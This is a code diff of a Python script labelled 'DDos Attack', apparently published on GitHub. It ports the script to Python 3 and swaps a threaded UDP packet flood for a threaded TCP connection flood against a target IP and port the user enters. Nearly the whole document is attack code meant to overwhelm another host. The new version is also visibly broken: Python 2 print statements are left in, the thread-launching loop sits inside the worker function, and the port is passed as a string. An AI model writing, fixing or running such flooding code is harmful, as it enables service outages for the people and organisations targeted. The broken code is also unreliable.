@@ -1,6 +1,6 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 # This code write by (Mr.nope)
-# DDos Attack v1.5.2
+# DDos Attack v2.0.0
 import os
 try:
    from colorama import Fore,init
@@ -10,7 +10,7 @@ except ImportError:
 import time
 import sys
 import socket
-import thread
+import threading
 import platform
 system = platform.uname()[0]
 def title():
@@ -47,7 +47,7 @@ def menu():
 |______| |______| |_______||_______|       |__| |__|  |___|    |___|  |__| |__||_______||___| |_|\n""" + color.blue + """
      ----[    This code write by (Mr.nope)   ]---
      -------[ github :""" + color.blue + """ https://github.com/mrprogrammer2938/ ]-----------""" + color.End
-    web = raw_input("\nEnter Target ip: ")
+    web = input("\nEnter Target ip: ")
     time.sleep(1)
     port = input("\nEnter Target port: ")
     victim_ip = socket.gethostbyname(web)
@@ -63,27 +63,14 @@ def menu():
     print"\nTarget port:", UDP_PORT
     color.red + "=============================================================================\n" + color.End
     time.sleep(3)
-    def dos(i):
-	    while True:
-                      try:
-                         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                         sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
-                         print color.green + "\nThe packet is sent to: " + color.red + web + color.End
-                      except:
-                          print "\nStop !!!\n"
-                          sys.exit()
-    for i in xrange(port):
-            try:
-               thread.start_new_thread( dos , ("Thread-"+str(i),) )
-            except:
-                   print " "
-                   sys.exit()
-
-    try:
+    def run(k):
         while True:
-            pass
-    except:
-        sys.exit()
+             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+             s.connect((web,port))
+             print(f"Packet send To {victim_ip}")
+        for i in range(10):
+           c = threading.Thread(target=run, args=[i])
+           c.start()
 if __name__ == '__main__':
     try:
         try:
